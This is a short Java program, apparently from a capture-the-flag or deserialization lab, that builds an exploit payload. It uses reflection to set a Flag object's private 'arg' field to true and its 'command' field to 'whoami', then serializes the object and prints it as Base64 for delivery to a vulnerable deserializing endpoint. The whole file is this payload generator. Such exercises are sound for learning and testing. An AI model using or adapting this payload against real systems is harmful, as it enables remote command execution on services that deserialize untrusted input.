package Seri.tmp;


import Seri.tmp.common.Flag;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class Se {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, IOException {
        Flag f = new Flag();
        Class clazz = f.getClass();

        Field arg = clazz.getDeclaredField("arg");
        arg.setAccessible(true);
        arg.set(f ,true);

        Field command = clazz.getDeclaredField("command");
        command.setAccessible(true);
        command.set(f ,"whoami");

//        Method method = clazz.getDeclaredMethod("sn");
//        method.setAccessible(true);
//        method.invoke(f ,null);

        serializeBase64(f);


    }
    public static void serializeBase64(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.flush();
        System.out.println(oos);
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
